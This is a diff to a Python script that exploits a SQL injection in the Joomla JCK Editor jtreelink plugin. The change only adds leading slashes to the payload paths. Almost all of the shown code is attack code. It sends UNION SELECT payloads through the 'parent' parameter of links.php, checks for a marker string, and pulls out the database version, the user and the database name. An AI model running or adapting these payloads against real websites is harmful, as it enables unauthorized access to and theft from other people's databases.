@@ -16,7 +16,7 @@ class warna :
 def cek(url):
 	print warna.HIJAU+"[+] Checking "+url+warna.TUTUP
 	payload = "/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=\" UNION SELECT NULL,NULL,0x54683173317374337374,NULL,NULL,NULL,NULL,NULL-- aa"
-	payloadver = "plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=%22%20UNION%20SELECT%20NULL,NULL,concat(version(),0x3a,0x3a,0x3a,user()),NULL,NULL,NULL,NULL,NULL--%20aa"
+	payloadver = "/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=%22%20UNION%20SELECT%20NULL,NULL,concat(version(),0x3a,0x3a,0x3a,user()),NULL,NULL,NULL,NULL,NULL--%20aa"
 	cek = requests.get(url+payload).text
 	cek2 = requests.get(url+payloadver).text
 	if (re.search("Th1s1st3st",cek) != None):
@@ -35,7 +35,7 @@ def database(url):
 	print warna.HIJAU+"[+] Checking "+url+warna.TUTUP
 	time.sleep(1)
 	print warna.HIJAU+"[+] Get the database name"+warna.TUTUP
-	payload = "plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=%22%20UNION%20SELECT%20NULL,NULL,concat(database()),NULL,NULL,NULL,NULL,NULL--%20aa"
+	payload = "/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=%22%20UNION%20SELECT%20NULL,NULL,concat(database()),NULL,NULL,NULL,NULL,NULL--%20aa"
 	cek = requests.get(url+payload).text
 	soup = BeautifulSoup(cek,'html.parser')
 	find = soup.find_all('node')
